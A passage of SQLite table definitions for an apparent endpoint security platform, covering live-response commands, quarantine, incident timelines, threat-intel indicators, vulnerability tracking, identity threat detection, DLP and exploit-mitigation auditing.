      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_crp_active ON custom_remediation_packages(is_active);
    CREATE INDEX IF NOT EXISTS idx_crp_category ON custom_remediation_packages(category);

    -- 146. LIVE_RESPONSE_COMMAND_SESSIONS — Real-Time Remote Investigation & Command Queue (Iteration 52)
    CREATE TABLE IF NOT EXISTS live_response_command_sessions (
      id TEXT PRIMARY KEY,
      session_id TEXT NOT NULL,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      operator TEXT NOT NULL DEFAULT 'SecOps Analyst',
      command_type TEXT NOT NULL CHECK(command_type IN ('EXEC_POWERSHELL', 'EXEC_CMD', 'GET_FILE', 'PUT_FILE', 'TERMINATE_PROCESS', 'ISOLATE_HOST', 'RESTORE_HOST', 'LIST_DIRECTORY', 'PROCESS_DUMP', 'REGISTRY_QUERY')),
      command_payload TEXT NOT NULL,
      status TEXT NOT NULL DEFAULT 'QUEUED' CHECK(status IN ('QUEUED', 'IN_PROGRESS', 'COMPLETED', 'FAILED', 'TIMED_OUT', 'CANCELLED')),
      output TEXT,
      exit_code INTEGER,
      queued_at TEXT DEFAULT (DATETIME('now')),
      executed_at TEXT,
      completed_at TEXT,
      duration_ms INTEGER
    );

    CREATE INDEX IF NOT EXISTS idx_lrcs_session ON live_response_command_sessions(session_id);
    CREATE INDEX IF NOT EXISTS idx_lrcs_device ON live_response_command_sessions(device_id);
    CREATE INDEX IF NOT EXISTS idx_lrcs_status ON live_response_command_sessions(status);

    -- 147. QUARANTINED_FILES_INVENTORY — Endpoint Malware Vault & File Forensics (Iteration 52)
    CREATE TABLE IF NOT EXISTS quarantined_files_inventory (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      original_path TEXT NOT NULL,
      file_name TEXT NOT NULL,
      sha256_hash TEXT NOT NULL,
      file_size_bytes INTEGER NOT NULL DEFAULT 0,
      threat_name TEXT NOT NULL DEFAULT 'Suspicious.Generic',
      quarantined_by TEXT NOT NULL DEFAULT 'SecOps Analyst',
      quarantine_vault_path TEXT NOT NULL,
      status TEXT NOT NULL DEFAULT 'QUARANTINED' CHECK(status IN ('QUARANTINED', 'RESTORED', 'DELETED', 'ANALYSIS_PENDING')),
      quarantined_at TEXT DEFAULT (DATETIME('now')),
      restored_at TEXT,
      notes TEXT
    );

    CREATE INDEX IF NOT EXISTS idx_qfi_device ON quarantined_files_inventory(device_id);
    CREATE INDEX IF NOT EXISTS idx_qfi_hash ON quarantined_files_inventory(sha256_hash);
    CREATE INDEX IF NOT EXISTS idx_qfi_status ON quarantined_files_inventory(status);
  
    -- 148. INCIDENT_INVESTIGATION_CASES — EDR Incident Correlation & Attack Storylines (Iteration 53)
    CREATE TABLE IF NOT EXISTS incident_investigation_cases (
      id TEXT PRIMARY KEY,
      title TEXT NOT NULL,
      description TEXT,
      severity TEXT NOT NULL DEFAULT 'MEDIUM' CHECK(severity IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      status TEXT NOT NULL DEFAULT 'ACTIVE' CHECK(status IN ('ACTIVE', 'UNDER_INVESTIGATION', 'CONTAINED', 'RESOLVED', 'FALSE_POSITIVE')),
      classification TEXT DEFAULT 'UNCLASSIFIED' CHECK(classification IN ('UNCLASSIFIED', 'TRUE_POSITIVE', 'FALSE_POSITIVE', 'BENIGN_POSITIVE')),
      risk_score INTEGER NOT NULL DEFAULT 50 CHECK(risk_score >= 0 AND risk_score <= 100),
      primary_device_id TEXT NOT NULL,
      primary_hostname TEXT NOT NULL,
      assigned_analyst TEXT NOT NULL DEFAULT 'Unassigned',
      root_cause TEXT,
      attack_storyline_json TEXT,
      mitre_tactics_json TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      resolved_at TEXT
    );

    CREATE INDEX IF NOT EXISTS idx_iic_status ON incident_investigation_cases(status);
    CREATE INDEX IF NOT EXISTS idx_iic_severity ON incident_investigation_cases(severity);
    CREATE INDEX IF NOT EXISTS idx_iic_device ON incident_investigation_cases(primary_device_id);

    -- 149. INCIDENT_ALERT_ASSOCIATIONS — Multi-Module Alert Aggregation Mapping (Iteration 53)
    CREATE TABLE IF NOT EXISTS incident_alert_associations (
      id TEXT PRIMARY KEY,
      incident_id TEXT NOT NULL,
      alert_source TEXT NOT NULL CHECK(alert_source IN ('SECURITY_EVENTS', 'TAMPER_AUDIT', 'ISOLATION_LOGS', 'QUARANTINE_INVENTORY', 'WEB_PROTECTION', 'USB_CONTROL', 'CUSTOM_DETECTION')),
      alert_id TEXT NOT NULL,
      alert_summary TEXT NOT NULL,
      associated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(incident_id) REFERENCES incident_investigation_cases(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_iaa_incident ON incident_alert_associations(incident_id);
    CREATE INDEX IF NOT EXISTS idx_iaa_alert ON incident_alert_associations(alert_source, alert_id);

    -- 150. INCIDENT_TIMELINE_MILESTONES — Chronological Kill-Chain Attack Milestones (Iteration 53)
    CREATE TABLE IF NOT EXISTS incident_timeline_milestones (
      id TEXT PRIMARY KEY,
      incident_id TEXT NOT NULL,
      phase_name TEXT NOT NULL CHECK(phase_name IN ('INITIAL_ACCESS', 'EXECUTION', 'PERSISTENCE', 'PRIVILEGE_ESCALATION', 'DEFENSE_EVASION', 'CREDENTIAL_ACCESS', 'DISCOVERY', 'LATERAL_MOVEMENT', 'COLLECTION', 'COMMAND_AND_CONTROL', 'EXFILTRATION', 'IMPACT', 'REMEDIATION')),
      milestone_title TEXT NOT NULL,
      details TEXT,
      evidence_artifact TEXT,
      mitre_technique_id TEXT,
      occurred_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(incident_id) REFERENCES incident_investigation_cases(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_itm_incident ON incident_timeline_milestones(incident_id);
    CREATE INDEX IF NOT EXISTS idx_itm_phase ON incident_timeline_milestones(phase_name);
    CREATE INDEX IF NOT EXISTS idx_itm_time ON incident_timeline_milestones(occurred_at ASC);
  
    -- 151. THREAT_INTEL_FEED_SOURCES — External STIX/TAXII, AbuseIPDB, OTX Feeds (Iteration 54)
    CREATE TABLE IF NOT EXISTS threat_intel_feed_sources (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      feed_url TEXT NOT NULL,
      feed_format TEXT NOT NULL DEFAULT 'STIX_TAXII_21' CHECK(feed_format IN ('STIX_TAXII_21', 'MISP_JSON', 'CSV_INDICATORS', 'ABUSE_IPDB', 'URLHAUS_JSON', 'CUSTOM_API')),
      poll_interval_hours INTEGER NOT NULL DEFAULT 6,
      auth_token_secret_key TEXT,
      confidence_weight INTEGER NOT NULL DEFAULT 80 CHECK(confidence_weight >= 0 AND confidence_weight <= 100),
      default_action TEXT NOT NULL DEFAULT 'ALERT' CHECK(default_action IN ('ALERT', 'BLOCK', 'ISOLATE_HOST', 'AUDIT')),
      indicator_count INTEGER NOT NULL DEFAULT 0,
      last_sync_status TEXT DEFAULT 'NEVER_SYNCED' CHECK(last_sync_status IN ('NEVER_SYNCED', 'SYNCING', 'SUCCESS', 'FAILED')),
      last_sync_time TEXT,
      is_enabled INTEGER NOT NULL DEFAULT 1 CHECK(is_enabled IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_tifs_enabled ON threat_intel_feed_sources(is_enabled);
    CREATE INDEX IF NOT EXISTS idx_tifs_format ON threat_intel_feed_sources(feed_format);

    -- 152. THREAT_INTEL_INDICATORS_CACHE — High-Speed Threat IOC Cache (Iteration 54)
    CREATE TABLE IF NOT EXISTS threat_intel_indicators_cache (
      id TEXT PRIMARY KEY,
      feed_id TEXT,
      indicator_type TEXT NOT NULL CHECK(indicator_type IN ('IPV4_ADDRESS', 'DOMAIN_FQDN', 'URL', 'SHA256_HASH', 'MD5_HASH', 'CIDR_SUBNET')),
      indicator_value TEXT NOT NULL,
      threat_type TEXT NOT NULL DEFAULT 'MALWARE' CHECK(threat_type IN ('MALWARE', 'RANSOMWARE', 'C2_BEACON', 'PHISHING', 'BOTNET', 'EXPLOIT_KIT', 'SUSPICIOUS_PROXY')),
      confidence_score INTEGER NOT NULL DEFAULT 85 CHECK(confidence_score >= 0 AND confidence_score <= 100),
      severity TEXT NOT NULL DEFAULT 'HIGH' CHECK(severity IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      description TEXT,
      mitre_techniques TEXT,
      is_active INTEGER NOT NULL DEFAULT 1 CHECK(is_active IN (0, 1)),
      expires_at TEXT,
      first_seen TEXT DEFAULT (DATETIME('now')),
      created_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(feed_id) REFERENCES threat_intel_feed_sources(id) ON DELETE SET NULL
    );

    CREATE INDEX IF NOT EXISTS idx_tiic_val ON threat_intel_indicators_cache(indicator_value);
    CREATE INDEX IF NOT EXISTS idx_tiic_type ON threat_intel_indicators_cache(indicator_type);
    CREATE INDEX IF NOT EXISTS idx_tiic_active ON threat_intel_indicators_cache(is_active);

    -- 153. THREAT_INTEL_MATCH_EVENTS — Real-Time Forensic Indicator Interceptions (Iteration 54)
    CREATE TABLE IF NOT EXISTS threat_intel_match_events (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      indicator_id TEXT,
      indicator_type TEXT NOT NULL,
      matched_value TEXT NOT NULL,
      source_context TEXT,
      action_taken TEXT NOT NULL DEFAULT 'BLOCKED' CHECK(action_taken IN ('BLOCKED', 'ALERTED', 'QUARANTINED', 'MONITORED')),
      severity TEXT NOT NULL DEFAULT 'HIGH' CHECK(severity IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      timestamp TEXT DEFAULT (DATETIME('now')),
      details TEXT,
      FOREIGN KEY(indicator_id) REFERENCES threat_intel_indicators_cache(id) ON DELETE SET NULL
    );

    CREATE INDEX IF NOT EXISTS idx_time_device ON threat_intel_match_events(device_id);
    CREATE INDEX IF NOT EXISTS idx_time_val ON threat_intel_match_events(matched_value);
    CREATE INDEX IF NOT EXISTS idx_time_timestamp ON threat_intel_match_events(timestamp DESC);
  
    -- 154. CVE_VULNERABILITIES_CATALOG — Threat & Vulnerability Management (TVM) CVE Catalog (Iteration 55)
    CREATE TABLE IF NOT EXISTS cve_vulnerabilities_catalog (
      cve_id TEXT PRIMARY KEY,
      title TEXT NOT NULL,
      description TEXT,
      cvss_score REAL NOT NULL DEFAULT 5.0 CHECK(cvss_score >= 0.0 AND cvss_score <= 10.0),
      severity TEXT NOT NULL DEFAULT 'MEDIUM' CHECK(severity IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      affected_vendor TEXT NOT NULL,
      affected_product TEXT NOT NULL,
      fixed_version TEXT,
      exploit_maturity TEXT NOT NULL DEFAULT 'UNPROVEN' CHECK(exploit_maturity IN ('UNPROVEN', 'POC_EXISTS', 'ACTIVE_IN_THE_WILD')),
      epss_score REAL NOT NULL DEFAULT 0.05 CHECK(epss_score >= 0.0 AND epss_score <= 1.0),
      cisa_kev INTEGER NOT NULL DEFAULT 0 CHECK(cisa_kev IN (0, 1)),
      published_date TEXT DEFAULT (DATETIME('now')),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_cvc_severity ON cve_vulnerabilities_catalog(severity);
    CREATE INDEX IF NOT EXISTS idx_cvc_product ON cve_vulnerabilities_catalog(affected_product);
    CREATE INDEX IF NOT EXISTS idx_cvc_kev ON cve_vulnerabilities_catalog(cisa_kev);

    -- 155. ENDPOINT_VULNERABILITY_FINDINGS — Host Vulnerability Exposure Audit (Iteration 55)
    CREATE TABLE IF NOT EXISTS endpoint_vulnerability_findings (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      cve_id TEXT NOT NULL,
      software_component TEXT NOT NULL,
      installed_version TEXT NOT NULL,
      fixed_version TEXT,
      remediation_status TEXT NOT NULL DEFAULT 'ACTIVE' CHECK(remediation_status IN ('ACTIVE', 'PATCH_PENDING', 'EXCEPTION_APPROVED', 'REMEDIATED')),
      detection_date TEXT DEFAULT (DATETIME('now')),
      remediated_at TEXT,
      notes TEXT,
      FOREIGN KEY(cve_id) REFERENCES cve_vulnerabilities_catalog(cve_id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_evf_device ON endpoint_vulnerability_findings(device_id);
    CREATE INDEX IF NOT EXISTS idx_evf_cve ON endpoint_vulnerability_findings(cve_id);
    CREATE INDEX IF NOT EXISTS idx_evf_status ON endpoint_vulnerability_findings(remediation_status);

    -- 156. VULNERABILITY_REMEDIATION_TASKS — Actionable Security Recommendations (Iteration 55)
    CREATE TABLE IF NOT EXISTS vulnerability_remediation_tasks (
      id TEXT PRIMARY KEY,
      cve_id TEXT NOT NULL,
      priority TEXT NOT NULL DEFAULT 'HIGH' CHECK(priority IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      title TEXT NOT NULL,
      remediation_action TEXT NOT NULL,
      impacted_device_count INTEGER NOT NULL DEFAULT 1,
      exposed_user_count INTEGER NOT NULL DEFAULT 1,
      assigned_admin TEXT NOT NULL DEFAULT 'SecOps Vulnerability Team',
      status TEXT NOT NULL DEFAULT 'OPEN' CHECK(status IN ('OPEN', 'IN_PROGRESS', 'COMPLETED')),
      due_date TEXT,
      completed_at TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(cve_id) REFERENCES cve_vulnerabilities_catalog(cve_id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_vrt_cve ON vulnerability_remediation_tasks(cve_id);
    CREATE INDEX IF NOT EXISTS idx_vrt_status ON vulnerability_remediation_tasks(status);
    CREATE INDEX IF NOT EXISTS idx_vrt_priority ON vulnerability_remediation_tasks(priority);
    -- =========================================================================
    -- ITERATION 56: Identity Threat Detection & Response (ITDR & Credential Defense Engine)
    -- =========================================================================
    -- Table 157: identity_threat_detections
    CREATE TABLE IF NOT EXISTS identity_threat_detections (
      id TEXT PRIMARY KEY,
      target_account TEXT NOT NULL,
      source_host TEXT NOT NULL,
      source_ip TEXT,
      domain_controller TEXT NOT NULL DEFAULT 'DC01.LOCALPILOT.CORP',
      attack_vector TEXT NOT NULL CHECK(attack_vector IN ('KERBEROASTING', 'ASREP_ROASTING', 'DCSYNC', 'LSASS_MEMORY_DUMP', 'HONEYTOKEN_TRIGGERED', 'PASSWORD_SPRAY', 'PASS_THE_HASH', 'GOLDEN_TICKET')),
      mitre_technique TEXT NOT NULL DEFAULT 'T1558',
      risk_score REAL NOT NULL DEFAULT 75.0,
      status TEXT NOT NULL DEFAULT 'NEW' CHECK(status IN ('NEW', 'INVESTIGATING', 'CONTAINED', 'DISMISSED')),
      remediation_action_taken TEXT,
      detected_at TEXT DEFAULT (DATETIME('now')),
      resolved_at TEXT,
      raw_evidence_json TEXT NOT NULL DEFAULT '{}'
    );

    CREATE INDEX IF NOT EXISTS idx_itd_account ON identity_threat_detections(target_account);
    CREATE INDEX IF NOT EXISTS idx_itd_vector ON identity_threat_detections(attack_vector);
    CREATE INDEX IF NOT EXISTS idx_itd_status ON identity_threat_detections(status);

    -- Table 158: identity_honeytokens_catalog
    CREATE TABLE IF NOT EXISTS identity_honeytokens_catalog (
      id TEXT PRIMARY KEY,
      honeytoken_type TEXT NOT NULL CHECK(honeytoken_type IN ('DECOY_USER_ACCOUNT', 'FAKE_SPN_SERVICE', 'CREDENTIAL_MANAGER_BLOB', 'REGISTRY_LSA_SECRET')),
      account_name TEXT NOT NULL UNIQUE,
      domain_name TEXT NOT NULL DEFAULT 'LOCALPILOT.CORP',
      spn TEXT,
      planted_on_host TEXT,
      description TEXT,
      is_active INTEGER NOT NULL DEFAULT 1,
      trigger_count INTEGER NOT NULL DEFAULT 0,
      last_triggered_at TEXT,
      created_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_ihc_type ON identity_honeytokens_catalog(honeytoken_type);
    CREATE INDEX IF NOT EXISTS idx_ihc_account ON identity_honeytokens_catalog(account_name);

    -- Table 159: identity_account_risk_scores
    CREATE TABLE IF NOT EXISTS identity_account_risk_scores (
      id TEXT PRIMARY KEY,
      account_name TEXT NOT NULL UNIQUE,
      account_type TEXT NOT NULL DEFAULT 'USER' CHECK(account_type IN ('USER', 'SERVICE_ACCOUNT', 'DOMAIN_ADMIN', 'LOCAL_ADMIN')),
      department TEXT,
      risk_score REAL NOT NULL DEFAULT 10.0,
      risk_level TEXT NOT NULL DEFAULT 'LOW' CHECK(risk_level IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      anomalous_logon_count INTEGER NOT NULL DEFAULT 0,
      lateral_movement_count INTEGER NOT NULL DEFAULT 0,
      containment_status TEXT NOT NULL DEFAULT 'NORMAL' CHECK(containment_status IN ('NORMAL', 'PASSWORD_RESET_REQUIRED', 'TOKENS_REVOKED', 'ACCOUNT_LOCKED')),
      last_assessed_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_iars_name ON identity_account_risk_scores(account_name);
    CREATE INDEX IF NOT EXISTS idx_iars_level ON identity_account_risk_scores(risk_level);
    CREATE INDEX IF NOT EXISTS idx_iars_status ON identity_account_risk_scores(containment_status);
    -- =========================================================================
    -- ITERATION 57: Data Loss Prevention & Sensitive Information Defense Engine (DLP)
    -- =========================================================================
    -- Table 160: dlp_classification_rules
    CREATE TABLE IF NOT EXISTS dlp_classification_rules (
      id TEXT PRIMARY KEY,
      rule_name TEXT NOT NULL UNIQUE,
      category TEXT NOT NULL CHECK(category IN ('FINANCIAL_PCI', 'PERSONAL_PII', 'SECRETS_CREDENTIALS', 'HEALTH_HIPAA', 'INTELLECTUAL_PROPERTY', 'CUSTOM_REGEX')),
      severity TEXT NOT NULL DEFAULT 'HIGH' CHECK(severity IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      pattern_regex TEXT NOT NULL,
      confidence_threshold REAL NOT NULL DEFAULT 80.0,
      enforcement_action TEXT NOT NULL DEFAULT 'BLOCK' CHECK(enforcement_action IN ('AUDIT_ONLY', 'BLOCK', 'ENCRYPT', 'QUARANTINE_FILE')),
      is_enabled INTEGER NOT NULL DEFAULT 1,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_dcr_category ON dlp_classification_rules(category);
    CREATE INDEX IF NOT EXISTS idx_dcr_severity ON dlp_classification_rules(severity);

    -- Table 161: dlp_file_scan_findings
    CREATE TABLE IF NOT EXISTS dlp_file_scan_findings (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      file_path TEXT NOT NULL,
      file_size_bytes INTEGER NOT NULL DEFAULT 0,
      classification_rule_id TEXT NOT NULL,
      rule_name TEXT NOT NULL,
      match_count INTEGER NOT NULL DEFAULT 1,
      sensitivity_severity TEXT NOT NULL DEFAULT 'HIGH' CHECK(sensitivity_severity IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      remediation_status TEXT NOT NULL DEFAULT 'UNENCRYPTED_EXPOSURE' CHECK(remediation_status IN ('UNENCRYPTED_EXPOSURE', 'SECURED_ENCRYPTED', 'FILE_QUARANTINED', 'EXCEPTION_APPROVED')),
      detected_at TEXT DEFAULT (DATETIME('now')),
      remediated_at TEXT,
      FOREIGN KEY(classification_rule_id) REFERENCES dlp_classification_rules(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_dfsf_device ON dlp_file_scan_findings(device_id);
    CREATE INDEX IF NOT EXISTS idx_dfsf_rule ON dlp_file_scan_findings(classification_rule_id);
    CREATE INDEX IF NOT EXISTS idx_dfsf_status ON dlp_file_scan_findings(remediation_status);

    -- Table 162: dlp_exfiltration_incidents
    CREATE TABLE IF NOT EXISTS dlp_exfiltration_incidents (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      user_account TEXT NOT NULL,
      channel TEXT NOT NULL CHECK(channel IN ('REMOVABLE_USB', 'CLIPBOARD_PASTE', 'BROWSER_UPLOAD', 'NETWORK_SHARE', 'PRINTER_SPOOL')),
      file_or_data_name TEXT NOT NULL,
      rule_id TEXT,
      rule_name TEXT NOT NULL,
      severity TEXT NOT NULL DEFAULT 'CRITICAL' CHECK(severity IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      action_taken TEXT NOT NULL CHECK(action_taken IN ('BLOCKED', 'AUDITED', 'USER_JUSTIFIED', 'QUARANTINED')),
      user_justification TEXT,
      intercepted_at TEXT DEFAULT (DATETIME('now')),
      raw_event_json TEXT NOT NULL DEFAULT '{}'
    );

    CREATE INDEX IF NOT EXISTS idx_dei_device ON dlp_exfiltration_incidents(device_id);
    CREATE INDEX IF NOT EXISTS idx_dei_channel ON dlp_exfiltration_incidents(channel);
    CREATE INDEX IF NOT EXISTS idx_dei_action ON dlp_exfiltration_incidents(action_taken);
    -- =========================================================================
    -- ITERATION 58: Endpoint Configuration Drift & CIS Benchmark Compliance Engine
    -- =========================================================================
    -- Table 163: cis_benchmark_rules
    CREATE TABLE IF NOT EXISTS cis_benchmark_rules (
      id TEXT PRIMARY KEY,
      benchmark_name TEXT NOT NULL DEFAULT 'CIS_WINDOWS_11_ENTERPRISE',
      section_id TEXT NOT NULL,
      title TEXT NOT NULL,
      description TEXT,
      profile_level TEXT NOT NULL DEFAULT 'LEVEL_1' CHECK(profile_level IN ('LEVEL_1', 'LEVEL_2', 'BITLOCKER_ADDON')),
      check_type TEXT NOT NULL CHECK(check_type IN ('REGISTRY_VALUE', 'AUDIT_POLICY', 'SECURITY_OPTION', 'POWERSHELL_QUERY')),
      target_path TEXT NOT NULL,
      target_key TEXT,
      expected_value TEXT NOT NULL,
      remediation_impact TEXT DEFAULT 'LOW',
      created_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_cbr_benchmark ON cis_benchmark_rules(benchmark_name);
    CREATE INDEX IF NOT EXISTS idx_cbr_level ON cis_benchmark_rules(profile_level);

    -- Table 164: cis_endpoint_compliance_audits
    CREATE TABLE IF NOT EXISTS cis_endpoint_compliance_audits (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      benchmark_name TEXT NOT NULL,
      total_rules_evaluated INTEGER NOT NULL DEFAULT 0,
      passed_rules_count INTEGER NOT NULL DEFAULT 0,
      failed_rules_count INTEGER NOT NULL DEFAULT 0,
      compliance_score_percent REAL NOT NULL DEFAULT 0.0,
      drift_detected INTEGER NOT NULL DEFAULT 0,
      audit_status TEXT NOT NULL DEFAULT 'COMPLETED' CHECK(audit_status IN ('PENDING', 'IN_PROGRESS', 'COMPLETED', 'FAILED')),
      evaluated_at TEXT DEFAULT (DATETIME('now')),
      findings_summary_json TEXT NOT NULL DEFAULT '{}'
    );

    CREATE INDEX IF NOT EXISTS idx_ceca_device ON cis_endpoint_compliance_audits(device_id);
    CREATE INDEX IF NOT EXISTS idx_ceca_score ON cis_endpoint_compliance_audits(compliance_score_percent);
    CREATE INDEX IF NOT EXISTS idx_ceca_drift ON cis_endpoint_compliance_audits(drift_detected);

    -- Table 165: cis_rule_remediation_scripts
    CREATE TABLE IF NOT EXISTS cis_rule_remediation_scripts (
      id TEXT PRIMARY KEY,
      rule_id TEXT NOT NULL,
      script_type TEXT NOT NULL DEFAULT 'POWERSHELL' CHECK(script_type IN ('POWERSHELL', 'REGISTRY_PATCH', 'CMD_BATCH')),
      remediation_code TEXT NOT NULL,
      rollback_code TEXT,
      reboot_required INTEGER NOT NULL DEFAULT 0,
      applied_count INTEGER NOT NULL DEFAULT 0,
      last_applied_at TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(rule_id) REFERENCES cis_benchmark_rules(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_crrs_rule ON cis_rule_remediation_scripts(rule_id);
    -- =========================================================================
    -- ITERATION 59: Windows Exploit Protection & Process Mitigation Engine (Exploit Guard)
    -- =========================================================================
    -- Table 166: exploit_mitigation_policies
    CREATE TABLE IF NOT EXISTS exploit_mitigation_policies (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT,
      target_group TEXT NOT NULL DEFAULT 'All Corporate Endpoints',
      system_dep INTEGER NOT NULL DEFAULT 1 CHECK(system_dep IN (0, 1)),
      system_aslr_bottom_up INTEGER NOT NULL DEFAULT 1 CHECK(system_aslr_bottom_up IN (0, 1)),
      system_aslr_force_relocate INTEGER NOT NULL DEFAULT 1 CHECK(system_aslr_force_relocate IN (0, 1)),
      system_aslr_high_entropy INTEGER NOT NULL DEFAULT 1 CHECK(system_aslr_high_entropy IN (0, 1)),
      system_sehop INTEGER NOT NULL DEFAULT 1 CHECK(system_sehop IN (0, 1)),
      system_cfg INTEGER NOT NULL DEFAULT 1 CHECK(system_cfg IN (0, 1)),
      status TEXT NOT NULL DEFAULT 'ACTIVE' CHECK(status IN ('ACTIVE', 'AUDIT_ONLY', 'DISABLED')),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_emp_status ON exploit_mitigation_policies(status);
    CREATE INDEX IF NOT EXISTS idx_emp_target ON exploit_mitigation_policies(target_group);

    -- Table 167: exploit_app_mitigations
    CREATE TABLE IF NOT EXISTS exploit_app_mitigations (
      id TEXT PRIMARY KEY,
      policy_id TEXT NOT NULL,
      executable_name TEXT NOT NULL,
      disallow_child_process_creation INTEGER NOT NULL DEFAULT 1 CHECK(disallow_child_process_creation IN (0, 1)),
      block_remote_image_loads INTEGER NOT NULL DEFAULT 1 CHECK(block_remote_image_loads IN (0, 1)),
      block_low_integrity_images INTEGER NOT NULL DEFAULT 1 CHECK(block_low_integrity_images IN (0, 1)),
      arbitrary_code_guard INTEGER NOT NULL DEFAULT 0 CHECK(arbitrary_code_guard IN (0, 1)),
      code_integrity_guard INTEGER NOT NULL DEFAULT 0 CHECK(code_integrity_guard IN (0, 1)),
      export_address_filter INTEGER NOT NULL DEFAULT 1 CHECK(export_address_filter IN (0, 1)),
      import_address_filter INTEGER NOT NULL DEFAULT 1 CHECK(import_address_filter IN (0, 1)),
      strict_handle_checks INTEGER NOT NULL DEFAULT 1 CHECK(strict_handle_checks IN (0, 1)),
      disable_win32k_system_calls INTEGER NOT NULL DEFAULT 0 CHECK(disable_win32k_system_calls IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(policy_id) REFERENCES exploit_mitigation_policies(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_eam_policy ON exploit_app_mitigations(policy_id);
    CREATE INDEX IF NOT EXISTS idx_eam_executable ON exploit_app_mitigations(executable_name);

    -- Table 168: exploit_endpoint_audits
    CREATE TABLE IF NOT EXISTS exploit_endpoint_audits (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      policy_id TEXT NOT NULL,
      policy_name TEXT NOT NULL,
      system_mitigations_compliant INTEGER NOT NULL DEFAULT 1 CHECK(system_mitigations_compliant IN (0, 1)),
      apps_evaluated_count INTEGER NOT NULL DEFAULT 0,
      apps_compliant_count INTEGER NOT NULL DEFAULT 0,
      apps_drifted_count INTEGER NOT NULL DEFAULT 0,
      compliance_score_percent REAL NOT NULL DEFAULT 100.0,
      drift_detected INTEGER NOT NULL DEFAULT 0 CHECK(drift_detected IN (0, 1)),
      findings_json TEXT NOT NULL DEFAULT '{}',
      last_evaluated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(policy_id) REFERENCES exploit_mitigation_policies(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_eea_device ON exploit_endpoint_audits(device_id);
    CREATE INDEX IF NOT EXISTS idx_eea_policy ON exploit_endpoint_audits(policy_id);
    CREATE INDEX IF NOT EXISTS idx_eea_drift ON exploit_endpoint_audits(drift_detected);
    -- =========================================================================
    -- ITERATION 60: User & Entity Behavior Analytics (UEBA) & Insider Risk Intelligence
    -- =========================================================================
    -- Table 169: ueba_risk_indicators
    CREATE TABLE IF NOT EXISTS ueba_risk_indicators (
      id TEXT PRIMARY KEY,
      indicator_name TEXT NOT NULL UNIQUE,
      category TEXT NOT NULL CHECK(category IN ('DATA_EXFILTRATION', 'ANOMALOUS_LOGON', 'PRIVILEGE_ABUSE', 'FLIGHT_RISK', 'RESOURCE_SNOOPING')),
      description TEXT,
      risk_weight INTEGER NOT NULL DEFAULT 15,
      threshold_value REAL NOT NULL DEFAULT 3.0,
      severity TEXT NOT NULL DEFAULT 'MEDIUM' CHECK(severity IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      is_active INTEGER NOT NULL DEFAULT 1 CHECK(is_active IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_uri_category ON ueba_risk_indicators(category);
